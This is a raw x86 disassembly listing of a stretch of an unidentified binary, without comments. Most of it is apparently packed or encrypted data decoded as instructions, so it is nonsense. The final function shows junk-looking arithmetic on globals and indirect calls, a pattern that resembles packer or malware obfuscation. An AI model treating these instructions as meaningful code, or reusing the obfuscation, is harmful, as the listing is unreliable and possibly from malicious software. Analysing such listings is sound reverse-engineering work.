  40fb53:	enter  0x4279,0x0
  40fb57:	ins    DWORD PTR es:[edi],dx
  40fb58:	cmp    eax,0xcfb0c134
  40fb5d:	xor    DWORD PTR [ebp+0x10],eax
  40fb60:	(bad)  
  40fb62:	out    0x9b,eax
  40fb64:	mov    ebp,DWORD PTR ds:[eax+0x6902a7c]
  40fb6b:	jns    0x40fb2a
  40fb6d:	cmp    DWORD PTR [esi],esi
  40fb6f:	add    esi,ebp
  40fb71:	sti    
  40fb72:	stos   BYTE PTR es:[edi],al
  40fb73:	je     0x40fb8d
  40fb75:	scas   eax,DWORD PTR es:[edi]
  40fb76:	test   DWORD PTR [eax],edi
  40fb78:	sub    eax,0xc284589d
  40fb7d:	mov    ss,WORD PTR [ebx-0x41e59d81]
  40fb83:	inc    esi
  40fb84:	xchg   edi,eax
  40fb85:	or     ebx,DWORD PTR [edi-0x5db364fd]
  40fb8b:	mov    al,ds:0xadc2fb9d
  40fb90:	loopne 0x40fbe0
  40fb92:	mov    dh,0xb5
  40fb94:	fistp  QWORD PTR ds:0x8fce0526
  40fb9a:	jbe    0x40fbcd
  40fb9c:	sbb    eax,0xe74e021c
  40fba1:	cmp    al,0xf
  40fba3:	xchg   BYTE PTR [ecx-0x7],bh
  40fba6:	(bad)  
  40fba7:	call   FWORD PTR [ebx-0x48]
  40fbaa:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x2b
  40fbc9:	sahf   
  40fbca:	lahf   
  40fbcb:	jns    0x40fb9d
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fb7d
  40fbd5:	out    0x54,al
  40fbd7:	push   esi
  40fbd8:	mov    dh,0x37
  40fbda:	cmp    eax,0x833912d6
  40fbdf:	shr    cl,0x71
  40fbe2:	sub    ah,ch
  40fbe4:	imul   eax,edx,0xb0542e7c
  40fbea:	iret   
  40fbeb:	loop   0x40fc31
  40fbed:	call   0x3372113f
  40fbf2:	or     DWORD PTR [edx-0x59da03ed],edi
  40fbf8:	add    ecx,DWORD PTR [eax+0x8]
  40fbfb:	cmp    BYTE PTR [eax+0x559fc02d],0xee
  40fc02:	and    DWORD PTR [ebx-0x57],ebx
  40fc05:	jmp    0x40fbd0
  40fc07:	push   es
  40fc08:	out    0x23,eax
  40fc0a:	pushf  
  40fc0b:	out    dx,al
  40fc0c:	mov    WORD PTR [eax+0x11],ds
  40fc0f:	mov    esi,0xe6a03bb4
  40fc14:	push   esp
  40fc15:	fadd   DWORD PTR [edx]
  40fc17:	scas   eax,DWORD PTR es:[edi]
  40fc18:	and    eax,0x53a3e1b7
  40fc1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc1e:	pop    edx
  40fc1f:	mov    edx,0xddc53aa3
  40fc24:	pop    es
  40fc25:	dec    ebp
  40fc26:	and    esp,DWORD PTR [edi]
  40fc28:	xor    al,0xdd
  40fc2a:	and    ecx,ebp
  40fc2c:	out    dx,eax
  40fc2d:	push   0x30da5170
  40fc32:	lds    ebp,FWORD PTR [ebx-0x73da06bc]
  40fc38:	push   edi
  40fc39:	test   cl,al
  40fc3b:	adc    BYTE PTR gs:[ecx],ch
  40fc3e:	(bad)  
  40fc3f:	mov    ch,0x93
  40fc41:	mov    ah,0x10
  40fc43:	dec    esi
  40fc44:	sbb    al,0xad
  40fc46:	xchg   ebx,eax
  40fc47:	ja     0x40fbf9
  40fc49:	mov    bl,0x52
  40fc4b:	mov    esp,0xbee59c49
  40fc50:	test   al,0xb3
  40fc52:	jecxz  0x40fc6f
  40fc54:	or     dl,BYTE PTR [esi-0x2f]
  40fc57:	or     BYTE PTR [eax],bl
  40fc59:	enter  0x8770,0x91
  40fc5d:	pop    edx
  40fc5e:	mov    ecx,0x8376bed7
  40fc63:	outs   dx,BYTE PTR ds:[esi]
  40fc64:	push   edi
  40fc65:	in     eax,0xec
  40fc67:	adc    dh,dh
  40fc69:	mov    esi,esp
  40fc6b:	jae    0x40fc44
  40fc6d:	or     BYTE PTR ds:0xb8a65498,dh
  40fc73:	pop    ebp
  40fc74:	pop    ss
  40fc75:	leave  
  40fc76:	push   ss
  40fc77:	sub    ebx,ebx
  40fc79:	in     eax,0x5a
  40fc7b:	stc    
  40fc7c:	pop    ss
  40fc7d:	sahf   
  40fc7e:	call   0x547fda89
  40fc83:	(bad)  
  40fc84:	cwde   
  40fc85:	mov    ds:0xeb4e34bf,eax
  40fc8a:	add    eax,0xa58d0e79
  40fc8f:	jb     0x40fc27
  40fc91:	mov    cl,0xd6
  40fc93:	shr    BYTE PTR [esi+eax*8-0x5c17d3b4],1
  40fc9a:	lahf   
  40fc9b:	call   0x2c370e65
  40fca0:	or     BYTE PTR [ecx-0x79],cl
  40fca3:	push   ebx
  40fca4:	std    
  40fca5:	push   esi
  40fca6:	out    0x21,al
  40fca8:	push   esi
  40fca9:	daa    
  40fcaa:	mov    ch,0xb3
  40fcac:	jne    0x40fc8b
  40fcae:	aaa    
  40fcaf:	mov    esp,0xf912777a
  40fcb4:	jmp    0xf0248adc
  40fcb9:	mov    ebx,0x68308536
  40fcbe:	xchg   edx,eax
  40fcbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcc0:	leave  
  40fcc1:	sar    dl,0x25
  40fcc4:	add    eax,0xffffff83
  40fcc7:	test   al,0xa
  40fcc9:	jbe    0x40fcac
  40fccb:	mov    WORD PTR [eax+0x29aed62a],fs
  40fcd1:	inc    esp
  40fcd2:	cwde   
  40fcd3:	push   0x9
  40fcd5:	out    dx,eax
  40fcd6:	xchg   edi,eax
  40fcd7:	add    ebx,ebx
  40fcd9:	pop    ebp
  40fcda:	cmp    DWORD PTR [eax+0x634b9b6e],ebx
  40fce0:	mov    edi,0xf82e5a1
  40fce5:	cmp    bh,BYTE PTR [ebx-0x4e]
  40fce8:	and    ecx,DWORD PTR [ebx+0x78]
  40fceb:	xchg   edi,eax
  40fcec:	pop    edx
  40fcee:	xchg   esi,eax
  40fcef:	sub    bh,BYTE PTR [ebp+0x44b7f108]
  40fcf5:	inc    ebp
  40fcf6:	add    esi,DWORD PTR [edx]
  40fcf8:	push   eax
  40fcf9:	push   edi
  40fcfa:	and    BYTE PTR [esi-0x16],dl
  40fcfd:	cmp    DWORD PTR [eax-0x7f],ebx
  40fd00:	or     bh,BYTE PTR [edi-0x20]
  40fd03:	dec    esp
  40fd04:	push   edx
  40fd05:	sub    eax,0x8994c991
  40fd0a:	popf   
  40fd0b:	adc    al,BYTE PTR [ecx+0x65820cf2]
  40fd11:	sbb    bh,BYTE PTR [edx+0x5f13347d]
  40fd17:	cmp    edx,ebx
  40fd19:	jmp    0xb83f023a
  40fd1e:	retf   
  40fd1f:	sub    ch,al
  40fd21:	inc    edx
  40fd22:	mov    dh,dh
  40fd24:	or     ecx,DWORD PTR [ebp+0x390d60ab]
  40fd2a:	lods   eax,DWORD PTR ds:[esi]
  40fd2b:	out    dx,al
  40fd2c:	(bad)  
  40fd2d:	cdq    
  40fd2e:	mov    ds:0x927d5eea,al
  40fd33:	or     dl,dh
  40fd35:	sbb    dl,BYTE PTR [edx+0x14]
  40fd38:	sar    al,cl
  40fd3a:	out    0x85,al
  40fd3c:	out    dx,al
  40fd3d:	outs   dx,DWORD PTR ds:[esi]
  40fd3e:	ins    DWORD PTR es:[edi],dx
  40fd3f:	icebp  
  40fd40:	xchg   ecx,eax
  40fd41:	ins    BYTE PTR es:[edi],dx
  40fd42:	inc    edx
  40fd43:	repnz sbb cl,BYTE PTR [ebp+0xd8dfe2c]
  40fd4a:	stos   BYTE PTR es:[edi],al
  40fd4b:	(bad)  
  40fd4c:	xor    dh,BYTE PTR [ebx-0x56]
  40fd4f:	inc    esp
  40fd50:	sub    eax,0xb06e3172
  40fd55:	fcomp  st(7)
  40fd57:	mov    bh,0xd
  40fd59:	(bad)  [ecx]
  40fd5b:	ss mov dh,0xe7
  40fd5e:	cmp    eax,0x63da73c5
  40fd63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd64:	loopne 0x40fd4f
  40fd66:	jbe    0x40fd1a
  40fd68:	enter  0xac06,0x22
  40fd6c:	sbb    BYTE PTR [ebp+0x5f],bh
  40fd6f:	mov    ch,0x7b
  40fd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd72:	popf   
  40fd73:	sub    BYTE PTR [edi+0x70fdfea3],ch
  40fd79:	and    eax,0x4d3e678a
  40fd7e:	cmp    al,0x9c
  40fd80:	mov    eax,0x9a291226
  40fd85:	aad    0x50
  40fd87:	pop    edi
  40fd88:	clc    
  40fd89:	pushf  
  40fd8a:	add    eax,0x9d8c6350
  40fd8f:	dec    esi
  40fd90:	ret    
  40fd91:	pushw  0x19
  40fd94:	xor    DWORD PTR [edi-0x77bf8d90],0xffffffa6
  40fd9b:	dec    eax
  40fd9c:	mov    bh,0x52
  40fd9e:	mov    bh,0x51
  40fda0:	inc    edx
  40fda1:	dec    eax
  40fda2:	inc    esi
  40fda3:	sub    eax,0x8a0af88d
  40fda8:	(bad)  
  40fda9:	mov    DWORD PTR [eax-0x5cdfe6f4],esi
  40fdaf:	or     ebp,eax
  40fdb1:	and    eax,0xfe5b66b3
  40fdb6:	mov    bl,0x3c
  40fdb8:	outs   dx,BYTE PTR ds:[esi]
  40fdb9:	aas    
  40fdba:	icebp  
  40fdbb:	aad    0x47
  40fdbd:	sti    
  40fdbe:	stos   BYTE PTR es:[edi],al
  40fdbf:	lods   al,BYTE PTR ds:[esi]
  40fdc0:	imul   edi,DWORD PTR [edi-0x5cd27e53],0xf
  40fdc7:	jl     0x40fdcc
  40fdc9:	or     BYTE PTR [ebx],0x9a
  40fdcc:	or     edi,DWORD PTR [ecx-0x7109bc48]
  40fdd2:	es add al,0x81
  40fdd5:	hlt    
  40fdd6:	pop    esp
  40fdd7:	mov    eax,0xbacf7211
  40fddc:	push   ecx
  40fddd:	test   eax,0x36fd7054
  40fde2:	jae    0x40fe0b
  40fde4:	mov    ds:0x91e6523e,eax
  40fde9:	mov    ch,0x7c
  40fdeb:	xlat   BYTE PTR ds:[ebx]
  40fdec:	pop    ds
  40fded:	imul   eax,DWORD PTR [edi-0x48],0xd9ca16d0
  40fdf4:	and    al,0x8b
  40fdf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdf7:	aas    
  40fdf8:	rol    DWORD PTR [esp+ebp*8],0x83
  40fdfc:	pop    ecx
  40fdfd:	mov    ds:0x77e8b533,al
  40fe02:	addr16 jo 0x40fe0a
  40fe05:	inc    ebx
  40fe06:	jmp    DWORD PTR [ebp+0xc]
  40fe09:	xor    dl,BYTE PTR [eax]
  40fe0b:	scas   al,BYTE PTR es:[edi]
  40fe0c:	push   edx
  40fe0d:	lds    ecx,FWORD PTR [esi+0x13]
  40fe10:	push   cs
  40fe11:	call   0x815c:0xbdba1628
  40fe18:	stos   DWORD PTR es:[edi],eax
  40fe19:	mov    esi,0x17af4311
  40fe1e:	sub    esi,DWORD PTR [edx+0x18f48b38]
  40fe24:	test   eax,0x1e333c58
  40fe29:	adc    al,0x2b
  40fe2b:	(bad)  
  40fe2c:	and    ecx,DWORD PTR [ecx]
  40fe2e:	loop   0x40fe0c
  40fe30:	push   0x5a76a742
  40fe35:	rcr    BYTE PTR [edi+eiz*4+0x6b],cl
  40fe39:	pop    ebp
  40fe3a:	jl     0x40fe33
  40fe3c:	inc    esi
  40fe3d:	gs jae 0x40fe73
  40fe40:	mov    DWORD PTR [edi+0x10],esi
  40fe43:	in     eax,dx
  40fe44:	js     0x40fe1d
  40fe46:	mov    di,WORD PTR [ecx-0x48]
  40fe4a:	clc    
  40fe4b:	pop    ss
  40fe4c:	xchg   edi,eax
  40fe4d:	xchg   ebp,eax
  40fe4e:	xor    BYTE PTR [edi+edx*2-0x73],al
  40fe52:	imul   esp,DWORD PTR [eax-0x5],0xe7fceade
  40fe59:	lods   eax,DWORD PTR ds:[esi]
  40fe5a:	push   0x11
  40fe5c:	jnp    0x40fe94
  40fe5e:	leave  
  40fe5f:	mov    ?,WORD PTR [edi-0x2f650447]
  40fe65:	mov    cl,0xf
  40fe67:	pop    edx
  40fe68:	ds stc 
  40fe6a:	mov    eax,0xb2d77346
  40fe6f:	retf   
  40fe70:	loopne 0x40feea
  40fe72:	fldenv ds:0xea42b226
  40fe78:	and    eax,DWORD PTR [esi+ecx*4]
  40fe7b:	and    DWORD PTR [edi],eax
  40fe7d:	stos   DWORD PTR es:[edi],eax
  40fe7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe7f:	js     0x40fea4
  40fe81:	xor    al,0xba
  40fe83:	(bad)  
  40fe84:	and    al,0x42
  40fe86:	or     edi,DWORD PTR [edi]
  40fe88:	or     eax,0xb1e170d5
  40fe8d:	and    ah,bl
  40fe8f:	adc    esi,edx
  40fe91:	sti    
  40fe92:	mov    ebx,?
  40fe94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe95:	loopne 0x40fe93
  40fe97:	push   ebp
  40fe98:	mov    al,0x54
  40fe9a:	bsr    ecx,ebx
  40fe9d:	cmp    BYTE PTR [esi],0xc9
  40fea0:	inc    esp
  40fea1:	dec    ebp
  40fea2:	pop    ecx
  40fea3:	loopne 0x40feec
  40fea5:	pop    eax
  40fea6:	xchg   ecx,eax
  40fea7:	jge    0x40fed4
  40fea9:	mov    eax,ds:0x39cea7bf
  40feae:	out    dx,eax
  40feaf:	(bad)  
  40feb0:	dec    ebx
  40feb1:	lock inc eax
  40feb3:	xchg   BYTE PTR [edx-0x2],cl
  40feb6:	sub    BYTE PTR [edx+0x45],bh
  40feb9:	fisub  DWORD PTR [ebp+edx*8-0x4]
  40febd:	je     0x40fe5b
  40febf:	push   ecx
  40fec0:	(bad)  
  40fec1:	mov    al,0x90
  40fec3:	mov    edx,0xf71c29f2
  40fec8:	(bad)  
  40fec9:	test   BYTE PTR [ebp-0x3c],0x17
  40fecd:	pop    es
  40fece:	dec    ecx
  40fecf:	loope  0x40fe76
  40fed1:	or     al,0x7b
  40fed3:	jne    0x40ff3d
  40fed5:	test   BYTE PTR [ebx-0x2dccf3bb],0xb9
  40fedc:	test   eax,0xe97264fc
  40fee1:	sbb    al,BYTE PTR [ebx]
  40fee3:	add    BYTE PTR [eax],al
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0xe144346
  40fef3:	xor    eax,0x7eb5de4d
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40fee8
  40fefe:	sub    esp,DWORD PTR [edi]
  40ff00:	hlt    
  40ff01:	js     0x40ff1c
  40ff03:	shl    al,0x20
  40ff06:	repnz mov al,ds:0x34886bb6
  40ff0c:	mov    WORD PTR [eax+0x34],ss
  40ff0f:	add    eax,0xf14f1651
  40ff14:	inc    ebp
  40ff15:	dec    edx
  40ff16:	out    dx,al
  40ff17:	call   0xc110:0x8203f51a
  40ff1e:	aad    0xec
  40ff20:	(bad)  
  40ff21:	mov    bh,0x58
  40ff23:	in     eax,0x32
  40ff25:	ror    edi,0x66
  40ff28:	in     al,0x10
  40ff2a:	fstp   DWORD PTR [esp+ecx*8-0x67c403]
  40ff31:	out    0x8c,al
  40ff33:	repnz out 0x1d,eax
  40ff36:	mov    bl,0xfc
  40ff38:	int3   
  40ff39:	(bad)  
  40ff3a:	out    0x32,al
  40ff3c:	ror    DWORD PTR [edi],cl
  40ff3e:	retf   0x1510
  40ff41:	repnz and DWORD PTR [ebp-0x7d],edi
  40ff45:	pop    eax
  40ff46:	xchg   ebx,eax
  40ff47:	shl    BYTE PTR [esi+edx*2+0x81feb4c],1
  40ff4e:	imul   edi,DWORD PTR [eax-0x7d],0xfffffffc
  40ff52:	adc    DWORD PTR ds:0x9589111f,edi
  40ff58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff59:	mov    edi,cs
  40ff5b:	adc    al,0x35
  40ff5d:	add    esi,DWORD PTR [ebx+0x69]
  40ff60:	loopne 0x40ff78
  40ff62:	in     eax,dx
  40ff63:	xor    dx,bx
  40ff66:	gs rol eax,1
  40ff69:	ret    0x553b
  40ff6c:	xchg   ecx,eax
  40ff6d:	push   edx
  40ff6e:	mov    ebx,0x8231305b
  40ff73:	xchg   DWORD PTR [edi+ebp*8+0x30a9c7ac],esi
  40ff7a:	mov    ah,0x77
  40ff7c:	lods   al,BYTE PTR ds:[esi]
  40ff7d:	ja     0x40ffb1
  40ff7f:	retf   0xe15e
  40ff82:	aad    0x77
  40ff84:	xor    eax,0xa6889bd5
  40ff89:	pop    eax
  40ff8a:	imul   eax,DWORD PTR ds:0x7e71331d,0x97d3bba7
  40ff94:	scas   eax,DWORD PTR es:[edi]
  40ff95:	mov    ch,0xad
  40ff97:	dec    ebx
  40ff98:	and    BYTE PTR [ebp-0x49],0x7e
  40ff9c:	mov    DWORD PTR [ecx+0x47760c27],eax
  40ffa2:	dec    esp
  40ffa3:	fisttp QWORD PTR ds:0x94fa74e5
  40ffa9:	xchg   BYTE PTR [ebx],bl
  40ffab:	jecxz  0x40ff61
  40ffad:	ror    DWORD PTR [ecx-0xe],0x8d
  40ffb1:	mov    dh,BYTE PTR [ebx+0x5e064475]
  40ffb7:	sbb    ah,BYTE PTR [eax]
  40ffb9:	inc    esi
  40ffba:	sub    al,0xae
  40ffbc:	xchg   BYTE PTR [ecx+ecx*8],dh
  40ffbf:	bswap  edx
  40ffc1:	hlt    
  40ffc2:	sub    eax,0xb399d3c1
  40ffc7:	or     ah,BYTE PTR ds:0x72448322
  40ffcd:	stos   DWORD PTR es:[edi],eax
  40ffce:	(bad)  
  40ffcf:	adc    bl,bh
  40ffd1:	push   ecx
  40ffd2:	inc    esp
  40ffd3:	fcmovnbe st,st(2)
  40ffd5:	cmp    DWORD PTR [ebx-0x3e],0x2e1360c9
  40ffdc:	jne    0x40ffb9
  40ffde:	sub    DWORD PTR [edi+0x0],ecx
  40ffe1:	inc    ebx
  40ffe2:	pop    ss
  40ffe3:	lods   al,BYTE PTR ds:[esi]
  40ffe4:	lods   al,BYTE PTR ds:[esi]
  40ffe5:	rol    DWORD PTR [ebp+edx*1-0x4056c814],0x52
  40ffed:	aaa    
  40ffee:	(bad)  
  40ffef:	ins    DWORD PTR es:[edi],dx
  40fff0:	fdivr  DWORD PTR [ebp-0x57310161]
  40fff6:	or     al,0xe3
  40fff8:	dec    eax
  40fff9:	push   0x1e48ff02
  40fffe:	jge    0x410005
  410000:	or     al,BYTE PTR [eax-0x7f]
  410003:	adc    BYTE PTR [ebx-0x42],ah
  410006:	stc    
  410007:	clc    
  410008:	dec    esp
  410009:	add    BYTE PTR es:[edx],al
  41000c:	push   ds
  41000d:	(bad)  
  41000e:	mov    esi,0x3a0412f5
  410013:	lock shr BYTE PTR [ecx+eiz*1],cl
  410017:	and    BYTE PTR [eax],0xd5
  41001a:	or     BYTE PTR [ecx+0x765ca79e],al
  410020:	pop    edi
  410021:	test   eax,0x4056495
  410026:	daa    
  410027:	xor    dl,dh
  410029:	rol    BYTE PTR [ebp+0x1163e54c],cl
  41002f:	loop   0x410039
  410031:	xchg   esi,eax
  410032:	sub    al,0x43
  410034:	cmp    bl,BYTE PTR [edi+0x4]
  410037:	leave  
  410038:	or     bh,ah
  41003a:	leave  
  41003b:	addr16 out 0xf3,eax
  41003e:	sub    al,0x81
  410040:	adc    eax,0xb0c4c0e3
  410045:	add    bh,bl
  410047:	jae    0x410078
  410049:	stc    
  41004a:	ror    BYTE PTR [ebp+0x74c4ca96],0x7a
  410051:	retf   
  410052:	iret   
  410053:	retf   
  410054:	or     BYTE PTR [ebx+0x36e9c14e],bh
  41005a:	jmp    0xf69b64e3
  41005f:	dec    ebx
  410060:	fiadd  WORD PTR [edi]
  410062:	outs   dx,DWORD PTR ds:[esi]
  410063:	sbb    eax,0xd42eb5b6
  410068:	and    ch,BYTE PTR [ebp+ebx*2+0x445f50c9]
  41006f:	call   0x65ab7ee6
  410074:	inc    eax
  410075:	pop    ebp
  410076:	inc    esi
  410077:	cmp    al,BYTE PTR [edi-0x12bbd96a]
  41007d:	out    0x1f,eax
  41007f:	arpl   cx,cx
  410081:	or     eax,0x6871e7fa
  410086:	pop    edx
  410087:	adc    DWORD PTR [ebp+0x63],esp
  41008a:	cmc    
  41008b:	fwait
  41008c:	add    ah,BYTE PTR [edx+0x72993469]
  410092:	popf   
  410093:	sbb    eax,0x67f500bd
  410098:	dec    esp
  410099:	sbb    BYTE PTR [edx-0x5a1c9f12],cl
  41009f:	ret    
  4100a0:	pop    ebx
  4100a1:	repnz loopne 0x41006a
  4100a4:	loopne 0x41004d
  4100a6:	pop    es
  4100a7:	adc    eax,0x6fa7e823
  4100ac:	mov    eax,0x840f2089
  4100b1:	out    dx,al
  4100b2:	div    ebp
  4100b4:	cmp    BYTE PTR [edx+0x2cdaacb8],dh
  4100ba:	sub    DWORD PTR [edx+0x293d3ef],ebp
  4100c0:	shl    DWORD PTR [esi+0x7130bbc2],cl
  4100c6:	push   es
  4100c7:	sti    
  4100c8:	jge    0x4100cb
  4100ca:	pop    eax
  4100cb:	dec    eax
  4100cc:	add    eax,0x38768b73
  4100d1:	dec    edi
  4100d2:	jmp    0x6524c7b5
  4100d7:	enter  0x20d0,0x2e
  4100db:	sub    ebp,ebp
  4100dd:	adc    dl,ch
  4100df:	and    DWORD PTR [eax+0x4a410aa1],edi
  4100e5:	cmp    edx,esp
  4100e7:	jge    0x4100cb
  4100e9:	mov    ds:0xaa9e6b7b,al
  4100ee:	add    al,0x53
  4100f0:	ror    cl,0x38
  4100f3:	repz fcmovne st,st(5)
  4100f6:	push   ebp
  4100f7:	mov    dh,0xcb
  4100f9:	xor    BYTE PTR [eax+ecx*2],al
  4100fc:	mov    ah,0x97
  4100fe:	jbe    0x410155
  410100:	shl    DWORD PTR [ecx],0x7a
  410103:	and    DWORD PTR [ecx+0xbd143f9],edx
  410109:	(bad)  
  41010a:	je     0x41016b
  41010c:	mov    bh,0x22
  41010e:	std    
  41010f:	ffree  st(2)
  410111:	cmp    esp,DWORD PTR [eax]
  410113:	das    
  410114:	jo     0x41013c
  410116:	rcr    DWORD PTR [ecx],0xfb
  410119:	test   DWORD PTR [ebx+eax*2+0x6a],ebp
  41011d:	scas   al,BYTE PTR es:[edi]
  41011e:	sbb    BYTE PTR [ecx+0x12],0x4a
  410122:	lods   al,BYTE PTR ds:[esi]
  410123:	mov    esi,DWORD PTR [esi+0x56]
  410126:	into   
  410127:	ins    BYTE PTR es:[edi],dx
  410128:	add    eax,0xaf4a37e
  41012d:	cli    
  41012e:	out    0xcb,al
  410130:	cs in  eax,0x47
  410133:	das    
  410134:	sub    DWORD PTR [esi+ebx*4-0x40],esi
  410138:	sbb    bh,ah
  41013a:	lds    edx,FWORD PTR [edi+0x460e47fe]
  410140:	xor    esp,DWORD PTR [eax+0x1e09cb25]
  410146:	dec    edi
  410147:	nop
  410148:	add    eax,0x9fea1635
  41014d:	adc    DWORD PTR [esi+0x4a],edx
  410150:	int    0xc
  410152:	xor    bl,BYTE PTR [ebx-0x7e]
  410155:	dec    esp
  410156:	jmp    0x760f7e67
  41015b:	dec    ebx
  41015c:	inc    ecx
  41015d:	pusha  
  41015e:	jle    0x4100f8
  410160:	mov    esp,0x4385d3
  410165:	adc    ebx,DWORD PTR [eax+0x5d]
  410168:	aaa    
  410169:	cmp    edx,DWORD PTR [ebx+eax*2-0x3c3268f9]
  410170:	loop   0x4101a6
  410172:	jl     0x41018a
  410174:	fwait
  410175:	sbb    eax,0x205d84ee
  41017a:	push   ds
  41017b:	sar    BYTE PTR [eax-0x50],cl
  41017e:	jbe    0x410156
  410180:	push   esi
  410181:	(bad)  
  410182:	aad    0x9c
  410184:	repz push cs
  410186:	imul   ecx,DWORD PTR [ecx],0x6
  410189:	int3   
  41018a:	clc    
  41018b:	xchg   esp,eax
  41018c:	mov    es,WORD PTR [edx]
  41018e:	mov    edx,0x78678ce
  410193:	add    BYTE PTR [esi+0x12],dh
  410196:	cli    
  410197:	sbb    BYTE PTR [ebx],bh
  410199:	scas   al,BYTE PTR es:[edi]
  41019a:	push   ecx
  41019b:	pop    edx
  41019c:	stos   BYTE PTR es:[edi],al
  41019d:	enter  0xdad3,0x22
  4101a1:	xchg   esp,eax
  4101a2:	daa    
  4101a3:	aad    0x78
  4101a5:	and    ecx,DWORD PTR [edx-0x42e50c78]
  4101ab:	cmp    dl,cl
  4101ad:	push   ds
  4101ae:	aaa    
  4101af:	xor    ah,bh
  4101b1:	sbb    eax,0xf779fa41
  4101b6:	mov    cl,0x4d
  4101b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101b9:	(bad)  
  4101ba:	push   edi
  4101bb:	adc    bl,0x21
  4101be:	clc    
  4101bf:	xchg   edx,eax
  4101c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c1:	stos   BYTE PTR es:[edi],al
  4101c2:	icebp  
  4101c3:	push   ecx
  4101c4:	mov    ch,0x7f
  4101c6:	iret   
  4101c7:	dec    eax
  4101c8:	xor    ebx,DWORD PTR [esi+edx*4+0x1b]
  4101cc:	mov    bh,0x9f
  4101ce:	sub    eax,0x207f186c
  4101d3:	jg     0x410213
  4101d5:	mov    esi,0x527433e6
  4101da:	hlt    
  4101db:	(bad)  
  4101dc:	ds push esp
  4101de:	lahf   
  4101df:	cmp    DWORD PTR [eax],0xada7a36c
  4101e5:	repz xchg edx,eax
  4101e7:	in     eax,0x66
  4101e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ea:	fiadd  DWORD PTR ds:0x2d6d2b5f
  4101f0:	xchg   esi,eax
  4101f1:	adc    BYTE PTR [edi-0xcbddbad],dh
  4101f7:	lock clc 
  4101f9:	rol    BYTE PTR [ebx-0x6a],cl
  4101fc:	lahf   
  4101fd:	lods   al,BYTE PTR ds:[esi]
  4101fe:	inc    edx
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43379f
  41021e:	adc    DWORD PTR ds:0x4337d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43370b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43382b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4337df
  41026b:	or     DWORD PTR ds:0x4337d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4337ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4337ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4337ab,ecx
  410291:	cmp    DWORD PTR ds:0x4337ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4337ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4337ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4337ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4337ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433703
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4337e7,0x43379f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4337e3,0x433797
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433757
  41031a:	sub    DWORD PTR ds:0x43371f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
